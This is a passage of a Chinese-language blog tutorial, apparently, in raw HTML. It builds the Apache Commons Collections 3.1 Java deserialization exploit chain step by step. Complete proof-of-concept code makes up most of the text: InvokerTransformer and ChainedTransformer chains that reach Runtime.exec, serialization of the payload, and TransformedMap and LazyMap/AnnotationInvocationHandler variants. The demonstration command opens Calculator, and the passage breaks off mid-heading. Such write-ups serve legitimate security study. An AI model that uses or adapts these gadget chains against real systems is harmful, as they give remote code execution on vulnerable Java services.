class="comment">//客户端构造payload</span></span><br><span class="line">    Transformer[] transformers = <span class="keyword">new</span> Transformer[] &#123;</span><br><span class="line">        new InvokerTransformer("exec",new Class[]&#123;String.class&#125;,new String[]&#123;"/Applications/Calculator.app/Contents/MacOS/Calculator"&#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    Transformer transformerChain = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//服务端触发所需内容</span></span><br><span class="line">    Object input=Class.forName(<span class="string">"java.lang.Runtime"</span>).getMethod(<span class="string">"getRuntime"</span>).invoke(Class.forName(<span class="string">"java.lang.Runtime"</span>));</span><br><span class="line">    transformerChain.transform(input);<span class="comment">//此处必须为input，作为第一个输入</span></span><br></pre></td></tr></table></figure><p>把payload放入Transformer数组中，需要转化成特定的Transformer格式才行。</p><h2 id="第三步-ConstantTransformer-gt-Runtime实例序列化"><a href="#第三步-ConstantTransformer-gt-Runtime实例序列化" class="headerlink" title="第三步 ConstantTransformer -&gt; Runtime实例序列化"></a>第三步 ConstantTransformer -&gt; Runtime实例序列化</h2><p>我们找到<code>ConstantTransformer</code>类跟<code>InvokkerTransformer</code>一样继承<code>Transforme</code>父类，可以进入数组<br>顾名思义ConstantTransformer类其实就只会存放一个常量；它的构造函数会写入这个变量，他的transform函数会返回这个变量。<br>把Runtime实例写入这个变量：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Transformer[] transformers = <span class="keyword">new</span> Transformer[] &#123;</span><br><span class="line">        <span class="comment">//以下两个语句等同,一个是通过反射机制得到，一个是直接调用得到Runtime实例</span></span><br><span class="line">        <span class="comment">// new ConstantTransformer(Class.forName("java.lang.Runtime").getMethod("getRuntime").invoke(Class.forName("java.lang.Runtime"))),</span></span><br><span class="line">        <span class="keyword">new</span> ConstantTransformer(Runtime.getRuntime()),</span><br><span class="line">        new InvokerTransformer("exec", new Class[] &#123;String.class &#125;, new Object[] &#123;"/Applications/Calculator.app/Contents/MacOS/Calculator"&#125;)</span><br><span class="line">    &#125;;</span><br><span class="line">    Transformer transformerChain = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line">    transformerChain.transform(<span class="keyword">null</span>);<span class="comment">//此处输入可以为任意值，因为不会被使用到，相当于初始第一个输入为我们设置的常量</span></span><br></pre></td></tr></table></figure><p>以上代码可以成功弹框执行！这里其实就是把之前的input放进chain里面去了。</p><p>那么我们模拟一下序列化与反序列化过程！</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//客户端构造payload</span></span><br><span class="line">    Transformer[] transformers = <span class="keyword">new</span> Transformer[] &#123;</span><br><span class="line">        <span class="keyword">new</span> ConstantTransformer(Class.forName(<span class="string">"java.lang.Runtime"</span>).getMethod(<span class="string">"getRuntime"</span>).invoke(Class.forName(<span class="string">"java.lang.Runtime"</span>))),</span><br><span class="line">        new InvokerTransformer("exec", new Class[] &#123;String.class &#125;, new Object[] &#123;"/Applications/Calculator.app/Contents/MacOS/Calculator"&#125;)</span><br><span class="line">    &#125;;</span><br><span class="line">    Transformer transformerChain = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line">    <span class="comment">//payload序列化写入文件，模拟网络传输</span></span><br><span class="line">    FileOutputStream f = <span class="keyword">new</span> FileOutputStream(<span class="string">"payload.bin"</span>);</span><br><span class="line">    ObjectOutputStream fout = <span class="keyword">new</span> ObjectOutputStream(f);</span><br><span class="line">    fout.writeObject(transformerChain);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//服务端反序列化payload读取</span></span><br><span class="line">    FileInputStream fi = <span class="keyword">new</span> FileInputStream(<span class="string">"payload.bin"</span>);</span><br><span class="line">    ObjectInputStream fin = <span class="keyword">new</span> ObjectInputStream(fi);</span><br><span class="line">    <span class="comment">//服务端反序列化成ChainedTransformer格式，并在服务端自主传入恶意参数input</span></span><br><span class="line">    Transformer transformerChain_now = (ChainedTransformer) fin.readObject();</span><br><span class="line">    transformerChain_now.transform(<span class="keyword">null</span>);</span><br></pre></td></tr></table></figure><p>但是因为Runtime类的定义没有继承<code>Serializable</code>类，所以是不支持反序列化的。</p><h2 id="第四步-服务端构造Runtime示例"><a href="#第四步-服务端构造Runtime示例" class="headerlink" title="第四步 服务端构造Runtime示例"></a>第四步 服务端构造Runtime示例</h2><p>既然我们没法在客户端序列化写入Runtime的实例，那就让服务端执行我们的命令生成一个Runtime实例呗？<br>我们知道Runtime的实例是通过<code>Runtime.getRuntime()</code>来获取的，而<code>InvokerTransformer</code>里面的反射机制可以执行任意函数。<br>同时，我们已经成功执行过Runtime类里面的exec函数。讲道理肯定是没问题的.</p><p>我们先看getRuntime方法的参数：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Runtime <span class="title">getRuntime</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> currentRuntime;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>没有参数，那就非常简单了</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Transformer[] transformers = <span class="keyword">new</span> Transformer[] &#123;</span><br><span class="line">            <span class="keyword">new</span> ConstantTransformer(Runtime<span class="class">.<span class="keyword">class</span>),//得到<span class="title">Runtime</span> <span class="title">class</span></span></span><br><span class="line"><span class="class">            //由于<span class="title">InvokerTransformer</span>的构造函数要求传入<span class="title">Class</span>类型的参数类型，和<span class="title">Object</span>类型的参数数值，所以封装一下，下面也一样</span></span><br><span class="line"><span class="class">            //上面传入<span class="title">Runtime</span>.<span class="title">class</span>，调用<span class="title">Runtime</span> <span class="title">class</span>的<span class="title">getRuntime</span>方法（由于是一个静态方法，<span class="title">invoke</span>调用静态方法，传入类即可）</span></span><br><span class="line">            new InvokerTransformer("getRuntime",new Class[]&#123;&#125;,new Object[]&#123;&#125;),</span><br><span class="line">            <span class="comment">//上面Runtime.getRuntime()得到了实例，作为这边的输入(invoke调用普通方法，需要传入类的实例)     </span></span><br><span class="line">            new InvokerTransformer("exec", new Class[] &#123;String.class &#125;, new Object[] &#123;"/Applications/Calculator.app/Contents/MacOS/Calculator"&#125;)</span><br><span class="line">    &#125;;</span><br><span class="line">    Transformer transformerChain = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line">    transformerChain.transform(<span class="keyword">null</span>);</span><br></pre></td></tr></table></figure><blockquote><p>invoke的return是根据被调用的函数return啥，invoke就return啥。<br>就好比我invoke一个我自定义的方法a，在a中，我return了字符串”1”。那么就是invoke的结果就是字符串”1”。<br>看以上的过程就是第一次Runtime.getRuntime()的结果输入了下一个InvokerTransformer</p></blockquote><p>但是！！！</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//InvokeTransformer关键语句：</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">transform</span><span class="params">(Object input)</span> </span>&#123;<span class="comment">//input为我们设置的常量Runtime.class</span></span><br><span class="line">        Class cls = input.getClass();<span class="comment">//！！！这里由于input是一个类，会得到java.lang.Class</span></span><br><span class="line">        <span class="comment">//在java.lang.Class类中去寻找getRuntime方法企图得到Runtime类对象，此处报错！！</span></span><br><span class="line">        Method method = cls.getMethod(<span class="keyword">this</span>.iMethodName, <span class="keyword">this</span>.iParamTypes);</span><br><span class="line">        <span class="keyword">return</span> method.invoke(input, <span class="keyword">this</span>.iArgs);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>还是会陷入死胡同：</p><p>得到Runtime类实例才能调用exec方法。<br>而得到Runtime类实例作为input，才能得到Runtime class，才能找到getRuntime方法，得到Runtime类实例………</p><h2 id="破局：反射！！！"><a href="#破局：反射！！！" class="headerlink" title="破局：反射！！！"></a>破局：反射！！！</h2><p>还是得反射去搞：</p><p>目前是开头不能获得<code>Class.forName(&quot;java.lang.Runtime&quot;)</code>，只能得到<code>Class.forName(&quot;java.lang.Class&quot;)</code></p><p>我们的最终目的是执行<br><code>Class.forName(&quot;java.lang.Runtime&quot;).getMethod(&quot;getRuntime&quot;).invoke(Class.forName(&quot;java.lang.Runtime&quot;)</code></p><p>这里的思路是：</p><ol><li>对于<code>Class.forName(&quot;java.lang.Class&quot;)</code>环境下，需要先把<code>getMethod</code>方法拿到。</li><li>再用<code>getMethod</code>方法去把获取Runtime类中的getRuntime函数反射出来，哪个类中调用getMethod去获取方法，实际上是由invoke函数里面的的第一个参数obj决定的</li><li>再通过反射机制获取反射机制中的invoke方法，执行上面获取的getRuntime函数</li><li></li></ol><p>先来获取getRuntime类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//目标语句</span></span><br><span class="line">Class.forName(<span class="string">"java.lang.Runtime"</span>).getMethod(<span class="string">"getRuntime"</span>)</span><br><span class="line"><span class="comment">//使用java.lang.Class开头</span></span><br><span class="line">Class.forName("java.lang.Class").getMethod("getMethod", new Class[] &#123;String.class, Class[].class &#125;).invoke(Class.forName("java.lang.Runtime"),"getRuntime",new Class[0]);</span><br><span class="line"><span class="comment">//invoke函数的第一个参数是Runtime类，我们需要在Runtime类中去执行getMethod，获取getRuntime参数</span></span><br></pre></td></tr></table></figure><p><img src="../images/%E3%80%90%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E3%80%91commons-collections-1%20%E7%BB%84%E4%BB%B6/image-20200914090729438.png" alt="image-20200914090729438"></p><p><img src="../images/%E3%80%90%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E3%80%91commons-collections-1%20%E7%BB%84%E4%BB%B6/image-20200914092306947.png" alt="image-20200914092306947"></p><p>先来构造第一层：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Class cls = input.getClass();<span class="comment">//cls = java.lang.Class</span></span><br><span class="line">Method method = cls.getMethod(<span class="keyword">this</span>.iMethodName, <span class="keyword">this</span>.iParamTypes); <span class="comment">//getMethod方法</span></span><br><span class="line"><span class="keyword">return</span> method.invoke(input, <span class="keyword">this</span>.iArgs); <span class="comment">//在Runtime中找getRuntime方法，并返回这个方法</span></span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">InvokerTransformer</span><span class="params">(String methodName, Class[] paramTypes, Object[] args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.iMethodName = methodName;</span><br><span class="line">        <span class="keyword">this</span>.iParamTypes = paramTypes;</span><br><span class="line">        <span class="keyword">this</span>.iArgs = args;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>对照着来，构造如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Transformer[] transformers = <span class="keyword">new</span> Transformer[] &#123;</span><br><span class="line">        <span class="keyword">new</span> ConstantTransformer(Runtime<span class="class">.<span class="keyword">class</span>),//先获取<span class="title">Runtime</span>实例</span></span><br><span class="line">        new InvokerTransformer("getMethod", new Class[] &#123;String.class, Class[].class &#125;, new Object[] &#123;"getRuntime", new Class[0] &#125;),</span><br><span class="line">       <span class="comment">//还需要填充，调用getRuntime得到Runtime实例,第一个参数是获取的方法，这里先获取getMethod方法，第二个是参数列表，这个是getMethod方法的参数列表，第三个参数是invoke方法的参数列表，这里我们想先反射出来getRuntime参数，Class[0]是用来占位的，这部分在经过transform函数处理之后，返回的是getRuntime()这样的一个方法。</span></span><br><span class="line">        new InvokerTransformer("exec", new Class[] &#123;String.class &#125;, new Object[] &#123;"/Applications/Calculator.app/Contents/MacOS/Calculator"&#125;)</span><br><span class="line">          <span class="comment">//最后一轮是先获取exec方法，invoke方法的命令是“/Applications/Calculator.app/Contents/MacOS/Calculator”</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>但是这里并不是这么简单的，细节：</p><p>这里需要清楚的是，在第二层出来之后，需要注意的是返回的是getRuntime这个方法，是Method类型的。它会进入到下一层循环，所以没法继续invoke这里需要进行反射出来invoke方法。</p><p>继续构造：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//input=getRuntime这个方法</span></span><br><span class="line">Class cls = input.getClass();<span class="comment">//cls = java.lang.Method（getRuntime方法是method类）</span></span><br><span class="line">Method method = cls.getMethod(<span class="keyword">this</span>.iMethodName, <span class="keyword">this</span>.iParamTypes); <span class="comment">//在method类中找到invoke方法，method=invoke方法</span></span><br><span class="line"><span class="keyword">return</span> method.invoke(input, <span class="keyword">this</span>.iArgs); <span class="comment">//调用invoke方法，input=getRuntime这个方法，传入自定义的参数</span></span><br></pre></td></tr></table></figure><p>以上最后一步有点复杂，method就是invoke方法，相当于使用invoke调用了invoke函数。<br>首先this.iMethodName, this.iParamTypes是根据invoke接口而定的：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">invoke</span><span class="params">(Object obj, Object... args)</span></span></span><br><span class="line"><span class="function"><span class="comment">//this.iMethodName="invoke"</span></span></span><br><span class="line"><span class="function"><span class="comment">//this.iParamTypes=new Class[] &#123;Object.class, Object[].class &#125;</span></span></span><br><span class="line"><span class="function"><span class="comment">//外面class、Object封装是InvokerTransformer类的构造函数要求</span></span></span><br></pre></td></tr></table></figure><p>按照invoke中的input才是它要调用的环境的准则。<br><code>invoke方法.invoke(input, this.iArgs)</code>实际上等于<code>input.invoke(this.iArgs)</code>，<br>而input=getRuntime方法，那么只要填入<code>this.iArgs</code>就好了</p><p>又由于getRuntime是个静态函数，不用太纠结输入obj，写作null。getRuntime方法不需要参数。<br><code>this.iArgs=null,new Object[0]</code></p><p>那么整合就如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Transformer[] transformers = <span class="keyword">new</span> Transformer[] &#123;</span><br><span class="line">    <span class="keyword">new</span> ConstantTransformer(Runtime<span class="class">.<span class="keyword">class</span>),</span></span><br><span class="line">    new InvokerTransformer("getMethod", new Class[] &#123;String.class, Class[].class &#125;, new Object[] &#123;"getRuntime", new Class[0] &#125;),</span><br><span class="line">    new InvokerTransformer("invoke", new Class[] &#123;Object.class, Object[].class &#125;, new Object[] &#123;null, new Object[0] &#125;),</span><br><span class="line">    new InvokerTransformer("exec", new Class[] &#123;String.class &#125;, new Object[] &#123;"/Applications/Calculator.app/Contents/MacOS/Calculator"&#125;)</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><img src="../images/%E3%80%90%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E3%80%91commons-collections-1%20%E7%BB%84%E4%BB%B6/20200104110053-6b91bb20-2e9e-1.jpg" alt="img"></p><p>一个字：妙！</p><p><img src="../images/%E3%80%90%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E3%80%91commons-collections-1%20%E7%BB%84%E4%BB%B6/image-20200915094410701.png" alt="image-20200915094410701"></p><h2 id="第五步-TransformedMap"><a href="#第五步-TransformedMap" class="headerlink" title="第五步 TransformedMap"></a>第五步 TransformedMap</h2><p>我们看一下目前的攻击流程</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">commons_collections_3_1</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="comment">//1.客户端构建攻击代码</span></span><br><span class="line">        <span class="comment">//此处构建了一个transformers的数组，在其中构建了任意函数执行的核心代码</span></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> Transformer[] &#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(Runtime<span class="class">.<span class="keyword">class</span>),</span></span><br><span class="line">                new InvokerTransformer("getMethod", new Class[] &#123;String.class, Class[].class &#125;, new Object[] &#123;"getRuntime", new Class[0] &#125;),</span><br><span class="line">                new InvokerTransformer("invoke", new Class[] &#123;Object.class, Object[].class &#125;, new Object[] &#123;null, new Object[0] &#125;),</span><br><span class="line">                new InvokerTransformer("exec", new Class[] &#123;String.class &#125;, new Object[] &#123;"/Applications/Calculator.app/Contents/MacOS/Calculator"&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="comment">//将transformers数组存入ChaniedTransformer这个继承类</span></span><br><span class="line">        Transformer transformerChain = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//payload序列化写入文件，模拟网络传输</span></span><br><span class="line">        FileOutputStream f = <span class="keyword">new</span> FileOutputStream(<span class="string">"payload.bin"</span>);</span><br><span class="line">        ObjectOutputStream fout = <span class="keyword">new</span> ObjectOutputStream(f);</span><br><span class="line">        fout.writeObject(transformerChain);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//2.服务端读取文件，反序列化，模拟网络传输</span></span><br><span class="line">        FileInputStream fi = <span class="keyword">new</span> FileInputStream(<span class="string">"payload.bin"</span>);</span><br><span class="line">        ObjectInputStream fin = <span class="keyword">new</span> ObjectInputStream(fi);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//服务端反序列化成ChainedTransformer格式，再调用transform函数</span></span><br><span class="line">        Transformer transformerChain_now = (ChainedTransformer) fin.readObject();</span><br><span class="line">        transformerChain_now.transform(<span class="keyword">null</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如何提高利用度？</p><h3 id="分装成Map"><a href="#分装成Map" class="headerlink" title="分装成Map"></a>分装成Map</h3><p>由于我们得到的是ChainedTransformer，一个转换链，<strong>TransformedMap</strong>类提供将map和转换链绑定的构造函数，只需要添加数据至map中就会自动调用这个转换链执行payload。</p><p>这样我们就可以把触发条件从显性的调用<strong>转换链的transform函数</strong>延伸到<strong>修改map的值</strong>。很明显后者是一个常规操作，极有可能被触发。</p><p>查看org.apache.commons.collections.map.TransformedMap#decorate源码：</p><p><img src="../images/%E3%80%90%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E3%80%91commons-collections-1%20%E7%BB%84%E4%BB%B6/image-20200914100613071.png" alt="image-20200914100613071"></p><p>try一下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    <span class="comment">//1.客户端构建攻击代码</span></span><br><span class="line">    <span class="comment">//此处构建了一个transformers的数组，在其中构建了任意函数执行的核心代码</span></span><br><span class="line">    Transformer[] transformers = <span class="keyword">new</span> Transformer[] &#123;</span><br><span class="line">            <span class="keyword">new</span> ConstantTransformer(Runtime<span class="class">.<span class="keyword">class</span>),</span></span><br><span class="line">            new InvokerTransformer("getMethod", new Class[] &#123;String.class, Class[].class &#125;, new Object[] &#123;"getRuntime", new Class[0] &#125;),</span><br><span class="line">            new InvokerTransformer("invoke", new Class[] &#123;Object.class, Object[].class &#125;, new Object[] &#123;null, new Object[0] &#125;),</span><br><span class="line">            new InvokerTransformer("exec", new Class[] &#123;String.class &#125;, new Object[] &#123;"/Applications/Calculator.app/Contents/MacOS/Calculator"&#125;)</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="comment">//将transformers数组存入ChaniedTransformer这个继承类</span></span><br><span class="line">    Transformer transformerChain = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//创建Map并绑定transformerChina</span></span><br><span class="line">    Map innerMap = <span class="keyword">new</span> HashMap();</span><br><span class="line">    innerMap.put(<span class="string">"value"</span>, <span class="string">"value"</span>);</span><br><span class="line">    <span class="comment">//给予map数据转化链</span></span><br><span class="line">    Map outerMap = TransformedMap.decorate(innerMap, <span class="keyword">null</span>, transformerChain);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//payload序列化写入文件，模拟网络传输</span></span><br><span class="line">    FileOutputStream f = <span class="keyword">new</span> FileOutputStream(<span class="string">"payload.bin"</span>);</span><br><span class="line">    ObjectOutputStream fout = <span class="keyword">new</span> ObjectOutputStream(f);</span><br><span class="line">    fout.writeObject(outerMap);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//2.服务端接受反序列化，出发漏洞</span></span><br><span class="line">    <span class="comment">//读取文件，反序列化，模拟网络传输</span></span><br><span class="line">    FileInputStream fi = <span class="keyword">new</span> FileInputStream(<span class="string">"payload.bin"</span>);</span><br><span class="line">    ObjectInputStream fin = <span class="keyword">new</span> ObjectInputStream(fi);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//服务端反序列化成Map格式，再调用transform函数</span></span><br><span class="line">    Map outerMap_now =  (Map)fin.readObject();</span><br><span class="line">    <span class="comment">//2.1可以直接map添加新值，触发漏洞</span></span><br><span class="line">    <span class="comment">//outerMap_now.put("123", "123");</span></span><br><span class="line">    <span class="comment">//2.2也可以获取map键值对，修改value，value为value，foobar,触发漏洞</span></span><br><span class="line">    Map.Entry onlyElement = (Map.Entry) outerMap.entrySet().iterator().next();</span><br><span class="line">    onlyElement.setValue(<span class="string">"foobar"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>有效的。</p><h2 id="lazyMap版本"><a href="#lazyMap版本" class="headerlink" title="lazyMap版本"></a>lazyMap版本</h2><p>直接上PoC：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">lazyMap</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException, NoSuchMethodException, IllegalAccessException, InvocationTargetException, InstantiationException, IOException </span>&#123;</span><br><span class="line">        Transformer[] transformers_exec = <span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(Runtime<span class="class">.<span class="keyword">class</span>),</span></span><br><span class="line">                new InvokerTransformer("getMethod",new Class[]&#123;String.class,Class[].class&#125;,new Object[]&#123;"getRuntime",null&#125;),</span><br><span class="line">                new InvokerTransformer("invoke",new Class[]&#123;Object.class, Object[].class&#125;,new Object[]&#123;null,null&#125;),</span><br><span class="line">                new InvokerTransformer("exec",new Class[]&#123;String.class&#125;,new Object[]&#123;"/Applications/Calculator.app/Contents/MacOS/Calculator"&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        Transformer chain = <span class="keyword">new</span> ChainedTransformer(transformers_exec);</span><br><span class="line"></span><br><span class="line">        HashMap innerMap = <span class="keyword">new</span> HashMap();</span><br><span class="line">        innerMap.put(<span class="string">"value"</span>,<span class="string">"ddddddd"</span>);</span><br><span class="line"></span><br><span class="line">        Map lazyMap = LazyMap.decorate(innerMap,chain);</span><br><span class="line">        Class clazz = Class.forName(<span class="string">"sun.reflect.annotation.AnnotationInvocationHandler"</span>);</span><br><span class="line">        Constructor cons = clazz.getDeclaredConstructor(Class<span class="class">.<span class="keyword">class</span>,<span class="title">Map</span>.<span class="title">class</span>)</span>;</span><br><span class="line">        cons.setAccessible(<span class="keyword">true</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 创建LazyMap的handler实例</span></span><br><span class="line">        InvocationHandler handler = (InvocationHandler) cons.newInstance(Override<span class="class">.<span class="keyword">class</span>,<span class="title">lazyMap</span>)</span>;</span><br><span class="line">        <span class="comment">// 创建LazyMap的动态代理实例</span></span><br><span class="line">        Map mapProxy = (Map) Proxy.newProxyInstance(LazyMap<span class="class">.<span class="keyword">class</span>.<span class="title">getClassLoader</span>(),<span class="title">LazyMap</span>.<span class="title">class</span>.<span class="title">getInterfaces</span>(), <span class="title">handler</span>)</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 创建一个AnnotationInvocationHandler实例，并且把刚刚创建的代理赋值给this.memberValues</span></span><br><span class="line">        InvocationHandler handler1 = (InvocationHandler)cons.newInstance(Override<span class="class">.<span class="keyword">class</span>, <span class="title">mapProxy</span>)</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 序列化</span></span><br><span class="line">        ByteArrayOutputStream baos = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        ObjectOutputStream oos = <span class="keyword">new</span> ObjectOutputStream(baos);</span><br><span class="line">        oos.writeObject(handler1);</span><br><span class="line">        oos.flush();</span><br><span class="line">        oos.close();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 本地模拟反序列化</span></span><br><span class="line">        ByteArrayInputStream bais = <span class="keyword">new</span> ByteArrayInputStream(baos.toByteArray());</span><br><span class="line">        ObjectInputStream ois = <span class="keyword">new</span> ObjectInputStream(bais);</span><br><span class="line">        Object obj = (Object) ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>也是可以的</p><h2 id="第六步-寻找readObject复写点"><a href="#第六步-寻找readObject复写点" class="headerlink" title="第六步 寻找readObject复写点"></a>第六步 